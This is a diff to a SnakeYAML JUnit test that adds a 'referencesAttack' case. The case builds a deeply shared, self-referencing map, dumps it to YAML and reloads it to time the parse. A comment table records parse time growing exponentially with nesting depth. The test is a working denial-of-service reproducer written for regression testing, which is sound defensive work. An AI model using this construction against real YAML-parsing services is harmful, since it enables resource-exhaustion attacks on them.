@@ -17,7 +17,9 @@ package org.yaml.snakeyaml.issues.issue377;
 
 import org.junit.Test;
 import org.yaml.snakeyaml.Yaml;
+import org.yaml.snakeyaml.constructor.SafeConstructor;
 
+import java.util.HashMap;
 import java.util.Map;
 
 import static org.junit.Assert.assertNotNull;
@@ -38,5 +40,57 @@ public class ReferencesTest {
         Yaml yaml = new Yaml();
         Map map = (Map) yaml.load(data);
         assertNotNull(map);
+    }
+
+    @Test
+    public void referencesAttack() {
+        HashMap root = new HashMap();
+        HashMap s1, s2, t1, t2;
+        s1 = root;
+        s2 = new HashMap();
+        long time1 = System.currentTimeMillis();
+        /*
+        the time to parse grows very quickly
+        SIZE -> time to parse in seconds
+        25 -> 1
+        26 -> 2
+        27 -> 3
+        28 -> 8
+        29 -> 13
+        30 -> 28
+        31 -> 52
+        32 -> 113
+        33 -> 245
+        34 -> 500
+         */
+        int SIZE = 25;
+        for (int i = 0; i < SIZE; i++) {
+
+            t1 = new HashMap();
+            t2 = new HashMap();
+            t1.put("foo", "1");
+            t2.put("bar", "2");
+
+            s1.put("a", t1);
+            s1.put("b", t2);
+            s2.put("a", t1);
+            s2.put("b", t2);
+
+            s1 = t1;
+            s2 = t2;
+        }
+
+        HashMap f = new HashMap();
+        f.put(f, "a");
+        f.put("g", root);
+
+        Yaml yaml = new Yaml(new SafeConstructor());
+        String output = yaml.dump(f);
+        //System.out.println(output);
+
+        // Load
+        yaml.load(output);
+        long time2 = System.currentTimeMillis();
+        System.out.println("Time was " + ((time2 - time1) / 1000) + " seconds.");
     }
 }
